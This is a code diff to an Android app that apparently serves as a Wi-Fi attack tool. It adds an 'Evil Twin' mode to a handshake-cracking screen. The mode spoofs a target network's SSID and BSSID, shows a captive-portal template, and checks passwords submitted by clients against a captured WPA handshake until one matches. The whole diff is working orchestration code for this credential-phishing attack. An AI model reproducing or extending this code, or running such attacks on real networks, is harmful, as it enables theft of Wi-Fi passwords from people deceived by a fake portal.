@@ -62,8 +62,15 @@ public class HandshakesFragment extends Fragment
     private LinearLayout keysList;
 
     private CrackDialog crackDialog;
+    private CaptivePortalDialog portalDialog;
     private String pendingWordlistName = "";
     private Uri pendingWordlist;
+
+    // AP crack mode: wifi4's Evil Twin hosts the AP, this screen runs its portal verification.
+    private String apBssid = "";
+    private String apName = "";
+    private String apTemplate = "default";
+    private String apPasswordToTry;
 
     private final ActivityResultLauncher<String[]> wordlistPicker =
             registerForActivityResult(new ActivityResultContracts.OpenDocument(), uri -> {
@@ -127,6 +134,8 @@ public class HandshakesFragment extends Fragment
     public void onDestroyView() {
         if (crackDialog != null) crackDialog.dismiss();
         crackDialog = null;
+        if (portalDialog != null) portalDialog.dismiss();
+        portalDialog = null;
         super.onDestroyView();
     }
 
@@ -154,6 +163,18 @@ public class HandshakesFragment extends Fragment
             // The recovered key is in the vault now: the row's CRACKED pill and the saved
             // passwords list both come from this same event.
             requestCaptures();
+        } else if ("psk_verified".equals(name)) {
+            onPasswordChecked(event);
+        } else if ("attack_done".equals(name)) {
+            if (portalDialog != null) {
+                portalDialog.dismiss();
+                portalDialog = null;
+            }
+            requestCaptures();
+        } else if ("error".equals(name) && portalDialog != null) {
+            String message = event.optString("message", "");
+            portalDialog.result(false, message.isEmpty()
+                    ? getString(R.string.wifi_captive_mismatch) : message);
         } else if ("error".equals(name) && crackDialog != null && crackDialog.isShowing()) {
             String message = event.optString("message");
             if (!message.isEmpty()) Snackbar.make(requireView(), message, Snackbar.LENGTH_LONG).show();
@@ -276,8 +297,78 @@ public class HandshakesFragment extends Fragment
     @Override
     public void onCrack(JSONObject capture) {
         crackDialog = new CrackDialog(requireContext(), capture, this::pickWordlist);
+        crackDialog.setApListener(this::startAp);
         crackDialog.show();
         WifiBridge.get(requireContext()).requestCrackTools();
+    }
+
+    // --------------------------------------------------------------- AP mode
+
+    /**
+     * The crack dialog's AP mode. A password typed there is checked against the saved handshake
+     * first (wifi4's vault); only when it does not match does the twin AP and its portal open.
+     */
+    private void startAp(String bssid, String ssid, String password, String template) {
+        if (!isAdded()) return;
+        if (OpxService.getState() != OpxService.STATE_READY) {
+            Snackbar.make(requireView(), R.string.wifi_engine_pending, Snackbar.LENGTH_LONG).show();
+            return;
+        }
+        apBssid = bssid == null ? "" : bssid;
+        apName = ssid == null || ssid.isEmpty() ? "" : ssid;
+        apTemplate = template == null || template.isEmpty() ? "default" : template;
+        WifiBridge bridge = WifiBridge.get(requireContext());
+        bridge.start();
+        if (password != null && !password.isEmpty()) {
+            apPasswordToTry = password;
+            Snackbar.make(requireView(), R.string.hc_ap_verifying, Snackbar.LENGTH_LONG).show();
+            bridge.verifyPsk(apBssid, password);
+            return;
+        }
+        openPortal();
+    }
+
+    /** Start wifi4's Evil Twin and the sheet a client's submitted password is checked in. */
+    private void openPortal() {
+        if (!isAdded()) return;
+        WifiBridge bridge = WifiBridge.get(requireContext());
+        portalDialog = new CaptivePortalDialog(requireContext(), apName, apTemplate,
+                password -> bridge.verifyPsk(apBssid, password));
+        portalDialog.show();
+        JSONObject options = new JSONObject();
+        try {
+            options.put("ssid", apName).put("template", apTemplate).put("portal", true);
+        } catch (org.json.JSONException ignored) {
+            // Three plain values.
+        }
+        bridge.attack("eviltwin", apBssid, options);
+    }
+
+    /** A password was checked against the capture; only a match closes the portal. */
+    private void onPasswordChecked(JSONObject event) {
+        boolean ok = event.optBoolean("ok");
+        if (apPasswordToTry != null) {
+            // The AP settings' own candidate: cracked outright, or go on to the portal.
+            String tried = apPasswordToTry;
+            apPasswordToTry = null;
+            if (ok) {
+                Snackbar.make(requireView(), getString(R.string.hc_ap_match, tried),
+                        Snackbar.LENGTH_LONG).show();
+                requestCaptures();
+            } else {
+                Snackbar.make(requireView(), R.string.hc_ap_nomatch, Snackbar.LENGTH_LONG).show();
+                openPortal();
+            }
+            return;
+        }
+        if (portalDialog == null) return;
+        if (ok) {
+            portalDialog.result(true, getString(R.string.wifi_captive_match));
+            // The portal comes down with the campaign that hosts it.
+            WifiBridge.get(requireContext()).stopAttack();
+        } else {
+            portalDialog.result(false, getString(R.string.wifi_captive_mismatch));
+        }
     }
 
     private void pickWordlist() {
